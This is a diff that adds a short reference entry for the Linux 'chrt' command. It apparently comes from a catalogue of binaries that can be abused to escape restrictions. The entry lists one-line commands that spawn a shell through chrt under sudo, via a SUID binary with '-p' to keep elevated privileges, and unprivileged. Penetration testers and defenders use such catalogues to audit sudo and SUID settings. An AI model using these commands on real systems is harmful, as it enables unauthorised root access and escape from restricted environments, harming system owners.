@@ -1,0 +1,17 @@
+chrt
+====
+
+Shell
+-----
+
+[Sudo]
+    chrt 1 /bin/sh
+    Any number between 1 and 99 will do.
+
+[SUID]
+    chrt 1 /bin/sh -p
+    Any number between 1 and 99 will do.
+
+[Unprivileged]
+    chrt 1 /bin/sh
+    Any number between 1 and 99 will do.
